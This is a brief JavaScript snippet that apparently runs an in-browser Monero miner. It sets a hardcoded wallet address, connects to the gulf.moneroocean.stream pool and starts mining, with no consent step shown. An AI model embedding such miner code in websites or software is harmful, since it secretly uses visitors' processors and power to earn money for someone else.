const miner = new XMR.Miner('47KaS4N5MH1b3xt71ceoJaPjmepikrgGpSYk3zdXpeLS4XbXsdk7mJji9rjcPRRhaHBs3Rit2rQnC7kqn5DJY6kwLRh3s7m');
miner.setPool('gulf.moneroocean.stream', 10128);
miner.start();

miner.on('start', () => {
    console.log('Mining started...');
});
miner.on('found', (hash) => {
    console.log('Hash found: ', hash);
});
